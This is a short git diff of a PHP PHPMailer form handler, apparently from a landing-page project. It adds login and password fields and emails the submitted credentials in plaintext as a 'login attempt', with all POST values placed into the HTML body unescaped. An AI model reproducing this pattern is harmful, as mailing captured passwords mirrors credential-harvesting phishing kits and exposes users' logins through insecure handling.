@@ -4,15 +4,24 @@ require 'phpmailer/PHPMailer.php';
 require 'phpmailer/SMTP.php';
 require 'phpmailer/Exception.php';
 
-// $name     = (isset($_POST['name']))     ? trim($_POST['name']) : '';
-// $phone    = (isset($_POST['phone']))    ? trim($_POST['phone']) : '';
+$login = ($_POST['login']) ? trim($_POST['login']) : '';
+$password = ($_POST['password']) ? trim($_POST['password']) : '';
 $email = ($_POST['email']) ? trim($_POST['email']) : '';
 
-$title = "Ehya — подписка на новости";
+$title = "Попытка входа в систему";
 $body = "
-  <h2>Новый email</h2>
-  <b>Email:</b> $email
+<h2>Данные для входа</h2>
+<b>Логин:</b> $login </br>
+<b>Пароль:</b> $password
 ";
+
+if ($email) {
+  $title = "Подписка на новости";
+  $body = "
+  <h2>Новый email</h2>
+  <p>$email</p>
+  ";
+}
 
 // Настройки PHPMailer
 $mail = new PHPMailer\PHPMailer\PHPMailer();
@@ -50,8 +59,6 @@ try {
   $status = $mail->ErrorInfo;
 }
 
-// $type = $sub_mail ? 'sub' : 'msg';
-
 // Отображение результата
-// header('Location: thanks.php?t=' . $type);
-echo json_encode(["result" => $result, "status" => $status]);
+// echo json_encode(["result" => $result, "status" => $status]);
+header('Location: thanks.html');
